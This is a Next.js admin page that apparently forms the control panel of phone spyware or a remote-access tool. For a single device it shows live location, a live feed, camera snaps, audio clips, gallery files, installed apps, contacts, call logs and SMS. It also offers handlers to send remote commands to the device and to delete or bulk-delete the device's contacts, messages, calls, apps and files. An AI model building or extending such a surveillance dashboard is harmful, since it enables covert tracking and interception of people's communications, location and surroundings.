// app/admin/devices/[id]/page.tsx
"use client";

import React from "react";
import { useParams } from "next/navigation";
import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
import { DeviceTabBar } from "@/components/admin/devices/DeviceTabBar";
import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder } from "lucide-react";
import { useDeviceDetail } from "@/components/admin/devices/useDeviceDetail";

export default function DeviceDetailPage() {
  const params = useParams();
  const deviceId = params.id as string;

  const {
    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, appCount,
    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement,
    handleFullRefresh, handleToggleLiveMovement, sendCommand, handleDeleteCommand,
    handleDeleteContact, handleDeleteCall, handleDeleteMessage, handleDeleteApp, handleDeleteFile,
    handleBulkDeleteContacts, handleBulkDeleteCalls, handleBulkDeleteMessages, handleBulkDeleteApps, handleBulkDeleteFiles,
  } = useDeviceDetail(deviceId);

  if (loading && !device) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" />
      </div>
    );
  }
  if (!device) return <div className="p-8 text-center text-white/50">Device not found</div>;

  const counts = (device as any)?.counts || {};
  const TABS = [
    { id: "map", label: "Live Map", icon: MapPin },
    { id: "stream", label: "Live Feed", icon: Radio },
    { id: "gallery", label: `Gallery (${counts.gallery ?? files.length})`, icon: Folder },
    { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
    { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
    { id: "apps", label: `Apps (${counts.apps ?? appCount})`, icon: Layers },
    { id: "contacts", label: `Contacts (${counts.contacts ?? contacts.length})`, icon: User },
    { id: "calls", label: `Calls (${counts.calls ?? calls.length})`, icon: Phone },
    { id: "messages", label: `SMS (${counts.messages ?? messages.length})`, icon: MessageSquare },
  ];

  return (
    <div className="space-y-6 pb-20 md:pb-8">
      {toast && (
        <div className="fixed top-6 right-6 z-50 py-3 px-5 rounded-2xl bg-black/90 border border-[#FFFC00]/40 text-[#FFFC00] text-xs font-bold shadow-2xl backdrop-blur-xl flex items-center gap-2">
          <span>{toast}</span>
        </div>
      )}

      <DeviceDetailHeader device={device} onRefresh={handleFullRefresh} isRefreshing={isRefreshing} />

      <DeviceTabBar tabs={TABS} activeTab={activeTab} onSelectTab={setActiveTab} />

      <DeviceTabViews
        activeTab={activeTab}
        device={device}
        locations={locations}
        contacts={contacts}
        calls={calls}
        messages={messages}
        captures={captures}
        audioClips={audioClips}
        files={files}
        filesLoading={filesLoading}
        isLiveMovement={isLiveMovement}
        onToggleLiveMovement={handleToggleLiveMovement}
        onSendCommand={sendCommand}
        onDeleteCommand={handleDeleteCommand}
        onDeleteContact={handleDeleteContact}
        onDeleteCall={handleDeleteCall}
        onDeleteMessage={handleDeleteMessage}
        onDeleteApp={handleDeleteApp}
        onDeleteFile={handleDeleteFile}
        onBulkDeleteContacts={handleBulkDeleteContacts}
        onBulkDeleteCalls={handleBulkDeleteCalls}
        onBulkDeleteMessages={handleBulkDeleteMessages}
        onBulkDeleteApps={handleBulkDeleteApps}
        onBulkDeleteFiles={handleBulkDeleteFiles}
      />
    </div>
  );
}